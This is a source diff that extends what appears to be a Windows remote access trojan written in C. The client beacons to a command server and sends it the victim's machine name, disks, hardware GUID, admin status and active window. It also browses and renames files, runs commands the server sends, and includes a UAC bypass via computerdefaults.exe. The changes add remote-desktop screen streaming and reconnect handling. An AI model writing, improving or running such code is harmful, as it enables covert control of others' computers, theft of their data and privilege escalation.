@@ -22,14 +22,15 @@
 #include <strsafe.h>
 #include <math.h>
 
-#include "_http_request.h"
-#include "_win_form.h"
+#include "HttpRequester.h"
+#include "WinForm.h"
+#include "DVpro.h"
+#include "RDP.h"
+#include "Shared.h"
 
 #pragma comment(lib, "User32.lib")
-#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "winmm.lib" )
 #pragma comment(lib, "Shlwapi.lib")
-
 
 
 #pragma region commands_to_send_from_client
@@ -43,6 +44,7 @@
 #define _SEND_NEW_MESSAGE "client_new_message;"
 #define _ACTIVE_WINDOW "actv_wndw;"
 #define _MAIN_DIRS "main_dirs;"
+#define _RDP_END "rdpend;"
 /* END client send tags */
 #pragma endregion
 
@@ -66,6 +68,8 @@
 #define _NEW_FOLDER "new_folder;"
 #define _GET_MAIN_DIRS "get_main_dirs;"
 #define _OPEN_THIS_URL "open_this_url;"
+#define _RDP_START "rdpstart;"
+#define _RECONNECT "recon;"
 /* END server recv tags */
 #pragma endregion
 
@@ -76,16 +80,8 @@
 #define CONNECTION_REFUSED 10061
 /* END connection failed tags */
 
-// START define size_s
-#define _1KB 1024
-#define _2KB _1KB * 2
-#define _4KB _1KB * 4
-#define _9KB _1KB * 9
-// END define size_s
 
-// START define keywords
-#define loop for (;;)
-// END define keywords
+
 #pragma endregion
 
 
@@ -94,7 +90,6 @@
 
 #pragma region declare_functions
 /* START declare functions */
-char* inttostr(int n);
 void msgBox(const char*, const char*, int);
 char* hostname_to_ip(const char*);
 char** split(const char*, const char*);
@@ -105,15 +100,11 @@ BOOL get_active_window(char*);
 BOOL delete_folder(WCHAR*);
 BOOL IsElevated();
 int win_system(const char*);
-char* wchar_to_char(const wchar_t*);
 char* get_pc_name();
 char* get_all_disks();
-wchar_t* charToWChar(const char*);
 int CreateRegKey(char*);
 _Bool UACPASSING(char*);
-//int silently_remove_directory(LPCTSTR dir);
 /* END declare functions */
-
 #pragma endregion
 
 
@@ -143,34 +134,41 @@ INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLin
 #pragma region conntion_region
 
 
-
-	char current_file_name[MAX_PATH];
-	GetModuleFileNameA(NULL, current_file_name, MAX_PATH);
+	BOOL is_getting_ip = FALSE;
 	char* ip = (char*)malloc(100);
-	char* request = "GET /myip HTTP/1.1\r\nHost: api.ipaddress.com\r\nConnection: close\r\n\r\n";
-	ip = get_via_socket(request, "209.126.119.177"); //maybe it uses windows 7 or lower and these versions not support ` libcurl natively `
-	if (ip == NULL) {
-		ip = "ERR_WHILE_GET_IP";
-	}
+
 _start:;
 	WSADATA wsa;
-	SOCKET s;
-	struct sockaddr_in server;
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
 		goto _start;
 	}
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+	char current_file_name[MAX_PATH];
+	GetModuleFileNameA(NULL, current_file_name, MAX_PATH);
+	if (!is_getting_ip) {
+		char* request = "GET /myip HTTP/1.1\r\nHost: api.ipaddress.com\r\nConnection: close\r\n\r\n";
+		ip = get_via_socket(request, "209.126.119.177"); //maybe it uses windows 7 or lower and these versions not support ` libcurl natively `
+		if (ip == NULL) {
+			ip = "ERR_WHILE_GET_IP";
+		}
+		is_getting_ip = TRUE;
+	}
+
+	SOCKET s;
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
-		WSACleanup();
 		goto _start;
 	}
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+		goto _start;
+
+	}
+	struct sockaddr_in server;
 	char* _IP = hostname_to_ip(HOST);
 	if (_IP == NULL) {
 		WSACleanup();
 		closesocket(s);
 
-		goto _start; 
 	}
 	server.sin_addr.s_addr = inet_addr(_IP);
 	server.sin_family = AF_INET;
@@ -199,39 +197,54 @@ _start:;
 			goto _start;
 		}
 	}
-	char* srvr_recv;
-	int recv_size = 0,
-		empty_recv = 0;
-	DWORD cht_ThreadID;
-	HANDLE cht_hndl = NULL;
-	int flag = 1;
-	setsockopt(
-			s,
-			IPPROTO_TCP,
-			TCP_NODELAY,
-			(const char*)&flag,
-			sizeof(int)
-	);
+	char* srvr_recv = NULL;
+	int recv_size = 0,empty_recv = 0;
+	DWORD ThreadID;
+	HANDLE cht_hndl = NULL,rdp_hndl = NULL;
+	DWORD flag = TRUE;
+
+	setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char*)&flag, sizeof(DWORD));
+
+	int already_connect = 0;
 #pragma endregion
 
 #pragma region loop_region
 
 	loop{
+			
 			srvr_recv = calloc(_2KB, sizeof(char*));
-			if ((recv_size = recv(s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
+			if ((recv_size = recv(s, srvr_recv, _2KB - 1, 0)) == SOCKET_ERROR)
 			{
+				connect(s, (struct sockaddr*)&server, sizeof(server));
+				int err_code = WSAGetLastError();
+				if (err_code == ALREADY_CONNECT) {
+					if (already_connect == 10) {
+						WSACleanup();
+						closesocket(s);
+						free(srvr_recv);
+						Sleep(1000);
+						goto _start;
+					}
+					free(srvr_recv);
+					Sleep(1000);
+					already_connect++;
+					continue;
+				}
 				WSACleanup();
 				closesocket(s);
-
+				free(srvr_recv);
+				Sleep(1000);
 				goto _start;
 			}
 			if (recv_size == 0) {
 				empty_recv++;
 			}
 			if (empty_recv == 10) {
+				connect(s, (struct sockaddr*)&server, sizeof(server));
+				int err_code = WSAGetLastError();
 				WSACleanup();
 				closesocket(s);
-
+				free(srvr_recv);
 				goto _start;
 			}
 
@@ -239,6 +252,8 @@ _start:;
 			//? keyword and execute commands just simple like that
 
 			if (strstr(srvr_recv, _GET_INFO) != NULL) {
+				HW_PROFILE_INFO hwProfileInfo;
+				GetCurrentHwProfile(&hwProfileInfo);
 				char* all_disks = get_all_disks();
 				char Active_Window[256];
 				get_active_window(Active_Window);
@@ -263,6 +278,8 @@ _start:;
 				strcat(info_buffer, "\n");
 				strcat(info_buffer, all_disks);
 				strcat(info_buffer, "\n");
+				strcat(info_buffer, wchar_to_char(hwProfileInfo.szHwProfileGuid));
+				strcat(info_buffer, "\n");
 				if (IsElevated()) {
 					strcat(info_buffer, "true_admin");
 				}
@@ -270,13 +287,14 @@ _start:;
 					strcat(info_buffer, "false_admin");
 
 				}
-				if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
+				if (send_dv(s, info_buffer, strlen(info_buffer), 0) < 0)
 				{
 					WSACleanup();
 					closesocket(s);
-
+					free(srvr_recv);
 					goto _start;
 				}
+				free(all_disks);
 			}
 			else if (strstr(srvr_recv, _REFRESH) != NULL) {
 				char Active_Window[256];
@@ -286,11 +304,11 @@ _start:;
 				strcat(refresh_message, "\n");
 				strcat(refresh_message, _ACTIVE_WINDOW);
 				strcat(refresh_message, Active_Window);
-				if (send(s, refresh_message, strlen(refresh_message), 0) < 0)
+				if (send_dv(s, refresh_message, strlen(refresh_message), 0) < 0)
 				{
 					WSACleanup();
 					closesocket(s);
-
+					free(srvr_recv);
 					goto _start;
 				}
 				free(refresh_message);
@@ -343,11 +361,11 @@ _start:;
 				strcat(tsk_mgr_tag, size);
 				strcat(tsk_mgr_tag, objChar);
 				int len = strlen(tsk_mgr_tag);
-				if (send(s, tsk_mgr_tag, len, 0) < 0)
+				if (send_dv(s, tsk_mgr_tag, len, 0) < 0)
 				{
 					WSACleanup();
 					closesocket(s);
-
+					free(srvr_recv);
 					goto _start;
 				}
 			}
@@ -360,11 +378,17 @@ _start:;
 			}
 			else if (strstr(srvr_recv, _START_CHAT) != NULL) {
 				//showConsole(FALSE);
+				if (send_dv(s, _START_CHAT, strlen(_START_CHAT), 0) < 0) {
+					WSACleanup();
+					closesocket(s);
+					free(srvr_recv);
+					goto _start;
+				}
 			_start_thread_chat:;
 				DATA data;
 				data.s = &s;
 				data.hInstance = &hInstance;
-				cht_hndl = CreateThread(NULL, 0, show_chat_form, (void*)&data, 0, &cht_ThreadID);
+				cht_hndl = CreateThread(NULL, 0, show_chat_form, (void*)&data, 0, &ThreadID);
 				if (WaitForSingleObject(cht_hndl, INFINITE) == WAIT_OBJECT_0) {
 					DWORD _exitcode;
 					if (GetExitCodeThread(cht_hndl, &_exitcode)) {
@@ -398,7 +422,8 @@ _start:;
 					size_to_send += strlen(_CLIENT_SEND_MAIN_DIR) +
 						strlen(objChar) +
 						strlen(new_line);
-					size_to_send += strlen(inttostr(size_to_send));
+					char* tmp = inttostr(size_to_send);
+					size_to_send += strlen(tmp);
 					char* size = inttostr(size_to_send);
 					memcpy(
 						fil_exp_tag,
@@ -421,26 +446,30 @@ _start:;
 						strlen(objChar) + 1
 					);
 					int len = strlen(fil_exp_tag);
-					if (send(s, fil_exp_tag, len, 0) < 0)
+					if (send_dv(s, fil_exp_tag, len, 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
-
+						free(srvr_recv);
 						goto _start;
 					}
+					free(fil_exp_tag);
+					free(size);
+					free(tmp);
 				}
 				else {
 					char info_buffer[_1KB] = _CLIENT_SEND_MAIN_DIR;
 					strcat(info_buffer, "err");
-					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
+					if (send_dv(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
-
+						free(srvr_recv);
 						goto _start;
 					}
 				}
-					free(tags);
+				free(tags);
+				json_object_put(files_in_min_dir);
 
 			}
 			else if (strstr(srvr_recv, _GET_THIS_SUB_MAIN_PATH) != NULL) {
@@ -456,7 +485,8 @@ _start:;
 					size_to_send += strlen(_CLIENT_SEND_SUB_MAIN_FILES) +
 						strlen(objChar) +
 						strlen(new_line);
-					size_to_send += strlen(inttostr(size_to_send));
+					char* tmp = inttostr(size_to_send);
+					size_to_send += strlen(tmp);
 					char* size = inttostr(size_to_send);
 					memcpy(
 						fil_exp_tag,
@@ -479,26 +509,30 @@ _start:;
 						strlen(objChar) + 1
 					);
 					int len = strlen(fil_exp_tag);
-					if (send(s, fil_exp_tag, len, 0) < 0)
+					if (send_dv(s, fil_exp_tag, len, 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
-
+						free(srvr_recv);
 						goto _start;
 					}
+					free(fil_exp_tag);
+					free(size);
+					free(tmp);
 				}
 				else {
 					char info_buffer[_1KB] = _CLIENT_SEND_SUB_MAIN_FILES;
 					strcat(info_buffer, "err");
-					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
+					if (send_dv(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
-
+						free(srvr_recv);
 						goto _start;
 					}
 				}
 				free(tags);
+				json_object_put(files_in_min_dir);
 
 			}
 			else if (strstr(srvr_recv,_GET_THIS_SUB_PATH) != NULL) {
@@ -514,7 +548,8 @@ _start:;
 					size_to_send += strlen(_CLIENT_SEND_SUB_FILES) +
 						strlen(objChar) +
 						strlen(new_line);
-					size_to_send += strlen(inttostr(size_to_send));
+					char* tmp = inttostr(size_to_send);
+					size_to_send += strlen(tmp);
 					char* size = inttostr(size_to_send);
 					memcpy(
 						fil_exp_tag,
@@ -537,26 +572,31 @@ _start:;
 						strlen(objChar) + 1
 					);
 					int len = strlen(fil_exp_tag);
-					if (send(s, fil_exp_tag, len, 0) < 0)
+					if (send_dv(s, fil_exp_tag, len, 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
+						free(srvr_recv);
 						goto _start;
 					}
+					free(fil_exp_tag);
+					free(tmp);
+					free(size);
 				}
 				else {
 					char info_buffer[_1KB] = _CLIENT_SEND_SUB_FILES;
 					strcat(info_buffer, "err");
-					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
+					if (send_dv(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
 						WSACleanup();
 						closesocket(s);
+						free(srvr_recv);
 						goto _start;
 					}
 
 				}
 				free(tags);
-
+				json_object_put(files_in_min_dir);
 			}
 			else if (strstr(srvr_recv, _EXECUTE_THIS_COMMAND_LINE) != NULL) {
 				  char** tags = split(srvr_recv, "\n");
@@ -585,10 +625,7 @@ _start:;
 				char** tags = split(srvr_recv, "\n");
 				char* old_name = tags[1];
 				char* new_name = tags[2];
-				if (MoveFileExA(old_name, new_name, MOVEFILE_COPY_ALLOWED)) {
-
-				}
-				else {
+				if (!MoveFileExA(old_name, new_name, MOVEFILE_COPY_ALLOWED)) {
 					//TODO: HANDLE ERR
 				}
 
@@ -646,26 +683,59 @@ _start:;
 				strcat(dirs, windows_dir);
 				strcat(dirs, "\n");
 				strcat(dirs, all_disks);
-				if (send(s, dirs, strlen(dirs), 0) < 0)
+				if (send_dv(s, dirs, strlen(dirs), 0) < 0)
 				{
 					WSACleanup();
 					closesocket(s);
+					free(srvr_recv);
 					goto _start;
 				}
-				
+				free(dirs);
+				free(all_disks);
 			}
 			
 #ifdef UACBYPASS_ENABLE
 			else if (strstr(srvr_recv, "uacbypass;") != NULL)
 			{
 				UACPASSING(current_file_name); 
-				system("start computerdefaults.exe"); 
-				exit(0); 
+				win_system("start computerdefaults.exe"); 
+				ExitProcess(0); 
 			} 
 #endif
+			else if (strstr(srvr_recv, _RDP_START) != NULL) {
+				SOCKETDATA sd;
+				sd.s = s;
+				FRAMES_THREAD(&sd);
+				char* rdp_end = _RDP_END;
 
+				if (send_dv(s, _RDP_END, strlen(_RDP_END), 0) < 0) {
+					WSACleanup();
+					closesocket(s);
+					free(srvr_recv);
+					goto _start;
+				}
+
+
+			}
+			else if (strstr(srvr_recv, _RDP_END) != NULL) {
+				char* rdp_end = _RDP_END;
+				if (send_dv(s, rdp_end, strlen(rdp_end), 0) < 0){
+					WSACleanup();
+					closesocket(s);
+					free(srvr_recv);
+					goto _start;
+				}
+			}
+			else if (strstr(srvr_recv, _RECONNECT) != NULL) {
+				WSACleanup();
+				closesocket(s);
+				free(srvr_recv);
+				goto _start;
+			}
 			//TODO: Complete commands `else if`
-			free(srvr_recv);
+			if (srvr_recv != NULL) {
+				free(srvr_recv);
+			}
 			
 
 		}/* END loop */
@@ -865,25 +935,6 @@ BOOL delete_folder(WCHAR * Wfolder) {
 }
 
 
-char** split(const char* str, const char* delim) {
-	char* s = _strdup(str);
-	if (strtok(s, delim) == 0) {
-		return NULL;
-	}
-	int nw = 1;
-	while (strtok(NULL, delim) != 0)
-		nw += 1;
-	strcpy(s, str);
-	char** v = malloc((nw + 1) * sizeof(char*));
-	int i;
-	v[0] = _strdup(strtok(s, delim));
-	for (i = 1; i != nw; ++i) {
-		v[i] = _strdup(strtok(NULL, delim));
-	}
-	v[i] = NULL;
-	free(s);
-	return v;
-}
 
 char* hostname_to_ip(const char* hostname) {
 	struct hostent* he;
@@ -1065,37 +1116,10 @@ BOOL get_active_window(char* window_title) {
 	return NULL;
 }
 
-char* wchar_to_char(const wchar_t* pwchar)
-{
-	char szTo[_1KB];
-	szTo[lstrlenW(pwchar)] = '\0';
-	WideCharToMultiByte(CP_ACP, 0, pwchar, -1, szTo, (int)lstrlenW(pwchar), NULL, NULL);
-	char* chr = _strdup(szTo);
-	return chr;
-}
-
-wchar_t* charToWChar(const char* text)
-{
-	wchar_t wszTo[_1KB];
-	wszTo[strlen(text)] = L'\0';
-	MultiByteToWideChar(CP_ACP, 0, text, -1, wszTo, (int)strlen(text));
-	wchar_t* wchr = StrDupW(wszTo);
-	return wchr;
-}
 
 char* get_pc_name() {
 	char* pc_name = getenv("COMPUTERNAME");
 	return pc_name;
-}
-
-char* inttostr(int n) {
-	char* result;
-	if (n >= 0)
-		result = malloc(floor(log10(n)) + 2);
-	else
-		result = malloc(floor(log10(n)) + 3);
-	sprintf(result, "%d", n);
-	return result;
 }
 
 
